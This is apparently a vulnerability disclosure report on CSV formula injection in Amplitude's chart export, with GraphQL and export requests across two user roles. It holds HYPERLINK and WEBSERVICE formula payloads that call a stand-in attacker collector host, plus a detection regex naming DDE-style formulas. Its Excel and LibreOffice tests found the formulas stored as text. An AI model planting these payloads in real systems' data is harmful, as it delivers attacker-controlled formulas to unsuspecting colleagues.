# CSV/Formula Injection in Amplitude Chart CSV Export — Cross-User Payload Delivery CONFIRMED, Formula Execution Unproven in Excel (Tab-Prefix Defense Holds)

**Target Location:** `POST https://app.amplitude.com/d/data/{app_id}/csv` + `POST https://app.amplitude.com/o/graphql` (`createChartEdit`, `chartEdit`) — Amplitude Analytics dashboard

**Affected Asset:** app.amplitude.com

**VRT (suggested):** External Behavior → CSV Injection (P5 baseline, may be re-scored based on demonstrated cross-user delivery)

**CVSS 3.1 (suggested):** `AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N` = **3.5 (Low)**
*(PR:L — a Viewer can plant the payload; UI:R — a peer must open the exported CSV; C:N — no evidence of data exfiltration; I:L — cell-level text substitution if any consumer evaluates formulas; A:N — no availability impact observed.)*

**Affected versions:** verified live 2026-10-21 on `app.amplitude.com`, org `464637` / app `862908`

---

## Summary

Amplitude's chart CSV export endpoint (`POST /d/data/{app}/csv`) writes an attacker-controlled chart `name` and `description` into the exported file with only an incomplete mitigation (a tab character inside the quoted cell). This report **proves cross-user delivery of the payload** via the chart-draft edit mechanism, **but honestly documents that formula evaluation does not occur in current Microsoft Excel (Office16, the primary spreadsheet target)** — the tab-prefixed formulas are stored as literal text on both the file-open and clipboard-paste routes.

A Viewer-role user can persist a chart draft whose `name`/`description` contain CSV formula payloads via the `createChartEdit` GraphQL mutation (server-minted editId). Any other principal in the org who retrieves the draft by its `editId` (the definition-bearing read is `chartEdit(editId)`) receives the full formula-bearing definition and, on export, receives a CSV containing the attacker's formulas verbatim. Cross-user delivery is reproduced **4/4** with two separate principals.

The CSV bytes that leave the server match the known CSV-injection byte patterns (`\t=`, `=CMD|`, `=WEBSERVICE`). Whether they execute depends on the spreadsheet application: **current Excel does not evaluate them**; LibreOffice (tested 2026-10-21, headless Calc via --convert-to xlsx) also stores them as text; Google Sheets remains untested (no Google credentials).

The submission is therefore filed at LOW with the cross-user delivery proven and the execution question explicitly left open for LibreOffice/Google Sheets (untested) and for non-spreadsheet CSV consumers (ETL pipelines, import tools, monitoring dashboards that read CSV automatically).

---

## Steps to Reproduce

All steps run on 2026-10-21 with two self-owned principals in the same org (`464637`):
- **C** = VIEWER (`orgRole 1`, `mohamed-9499-2+member@agentmail.to`)
- **B** = ORG_ADMIN (`orgRole 4`, `mohamed-9499-3@agentmail.to`)

### Step 1 — the Viewer mints a formula-bearing chart draft

```
POST /o/graphql HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER SESSION — redacted>
Content-Type: application/json
x-csrf-token: 1
Origin: https://app.amplitude.com

{"query":"mutation CreateChartEdit($chartId: String, $definition: JSON!) { createChartEdit(chartId: $chartId, definition: $definition) { editId chartId } }","variables":{"chartId":null,"definition":{"app_id":"862908","name":"=HYPERLINK(\"https://collector.attacker.example/hyperlink_probe\",\"click\")","description":"=WEBSERVICE(\"https://collector.attacker.example/webservice_probe\")","chart_type":"line","group_by":[],"orClauses":[{"v":2,"clauses":[]}],"interval":0,"timeRange":"30d"}}}
```

→ **200**, `data.createChartEdit.editId = "3retlqdc"` (server-minted).

### Step 2 — the Org Admin reads the same draft by id

```
POST /o/graphql HTTP/1.1
Host: app.amplitude.com
Cookie: <ORG_ADMIN SESSION — redacted>
Content-Type: application/json
x-csrf-token: 1

{"query":"query ChartEdit($editId: String!) { chartEdit(editId: $editId) { editId chartId definition } }","variables":{"editId":"3retlqdc"}}
```

→ **200**, B receives the full formula-bearing `definition` including C's `name` and `description`. **Cross-principal read confirmed** — B is a different user in the same org and did not create this draft.

### Step 3 — the Org Admin exports C's draft to CSV

```
POST /d/data/862908/csv HTTP/1.1
Host: app.amplitude.com
Cookie: <ORG_ADMIN SESSION — redacted>
Content-Type: application/x-www-form-urlencoded
x-csrf-token: 1

definition=<URL-encoded definition from Step 2>&downloadId=wave7&name=wave7&headers=[]&chart_edit_id=3retlqdc
```

→ **200**, `Content-Type: text/csv; attachment`. The response body contains:

```
"\t=HYPERLINK(""https://collector.attacker.example/hyperlink_probe"",""click"")"
"\t=WEBSERVICE(""https://collector.attacker.example/webservice_probe"")"
```

C's formulas appear verbatim in B's export. This is reproducible **4/4** across separate runs.

### Step 4 — the formula execution question (Test C, honest answer)

The same CSV was opened in **current Microsoft Excel (Office16)** via COM automation (`Workbooks.Open` and `Worksheet.Paste`):

| Input | Excel behavior |
|---|---|
| `"\t=1+1"\r\n` (tab inside quoted cell) | stored as TEXT — **not evaluated** |
| `"\t1+1"\r\n` (benign control) | stored as TEXT — expected |
| Real Amplitude export rows (`\t=HYPERLINK(...)`) | stored as TEXT — **not evaluated** |
| Same rows pasted from clipboard into a live worksheet | literal text — **not evaluated** |

**Result:** the tab-prefixed formulas do NOT execute in current Excel on either the file-open or clipboard-paste route. LibreOffice 26.8.1 (fresh install, headless Calc) also stores the tab-prefixed formula as TEXT — tab-prefix defense HOLDS in both Excel and LibreOffice. Google Sheets remains untested (no Google credentials available).

---

## Impact

**Proven:** A Viewer can persist a chart draft containing spreadsheet formulas in its `name`/`description` fields. A different principal in the same org (e.g. an Admin or Analyst) can retrieve that draft via its `editId` and export it, producing a CSV file on their own machine that contains the attacker's formula bytes. The export is byte-for-byte the same shape as the standard Amplitude CSV exports used by analysts daily.

**Unproven / not demonstrated:** That the formulas actually execute when the peer opens the file in Excel. Current Excel stores tab-prefixed formulas as text. Evaluation in Google Sheets is untested (no Google credentials); LibreOffice 26.8.1 was tested 2026-10-21 and stored the payload as text. Execution in non-spreadsheet CSV consumers (ETL pipelines, monitoring tools, data-import scripts) is also untested.

**Realistic severity given the evidence:** LOW. The cross-user payload delivery is real and reproducible; the actual harm depends on whether a downstream consumer evaluates the formula. Until that consumer is identified and tested, the demonstrated impact is a peer receiving a CSV file whose cells contain attacker-controlled text.

---

## Remediation

1. **Sanitize at the source, not at the exporter.** Reject or escape any leading `=`, `@`, `+`, `-`, `\t`, or `\r` in `definition.name` and `definition.description` at the `createChartEdit` / `createChart` mutation layer — before the value is ever stored.
2. **Replace the in-cell tab with a literal `'\t'` escape** (backslash + t) or a space. The current raw tab byte does not reliably prevent evaluation across all spreadsheet applications.
3. **Reject DDE-shaped values at the definition-validation layer.** Any value matching `^=\s*(CMD\||WEBSERVICE\(|HYPERLINK\(|...)` should be rejected with a clear validation error.
4. **Consider a warning banner** in the export flow when the definition contains characters commonly used in CSV injection.

---

## What this is NOT

- **Not a proven code-execution vulnerability.** Current Excel does not evaluate the tab-prefixed formulas; no DDE/WEBSERVICE/HYPERLINK execution was demonstrated in any spreadsheet application during testing.
- **Not a remote-code-execution primitive on Amplitude's servers.** The formula, if it ever executes, runs in the victim's spreadsheet client — not on Amplitude infrastructure.
- **Not a cross-tenant attack.** The draft is readable only by principals in the same org. No cross-tenant data path is claimed.
- **Not a `createChart` bypass.** The saved-chart path (`createChart` mutation) remained unrecovered in testing; this report uses the `createChartEdit` draft mechanism instead.
- **Not an `workspaceChartDrafts` list leak.** The list op returns 0 for both principals in the current product state; the cross-user channel tested here is the direct `chartEdit(editId)` read by id, not list discovery.
- **Not a fully tested formula evaluation.** LibreOffice was tested 2026-10-21 and stored the payload as text. Google Sheets was not testable (no Google credentials available on the test host). The submission does not claim evaluation in Google Sheets.

---

## Evidence

- `hunt-app-amplitude/WAVE7-CSV-INJECTION-PROOF.md` (full report with revised impact)
- `hunt-app-amplitude/evidence-wave7/w7_testb.json`, `w7_testb2.json`, `w7_testb3.json` (raw request/response for Steps 1–4)
- `hunt-app-amplitude/evidence-wave7/w7_cross_user_export_b3.csv` (the clean cross-user export — B's CSV containing C's formulas)
- `hunt-app-amplitude/evidence-wave7/w7_testc_excel_results.json` (Excel COM evaluation results)
- `hunt-app-amplitude/evidence-wave7/w7_testc_paste_result.json` (clipboard-paste route)
- `wave7_testb.py`, `wave7_testb2.py`, `wave7_testb3.py`, `wave7_testc.py`, `wave7_testc2.py` (harness scripts)
- `FINDINGS/LEDGER.md` (wave-7 entry, 2026-10-21)

Testing dates: 2026-10-20 (wave-6 initial discovery) and 2026-10-21 (wave-7 cross-user + Excel evaluation proof). Self-owned tenant (org `464637` / app `862908`). Zero foreign-org touches. All objects cleaned with read-back.
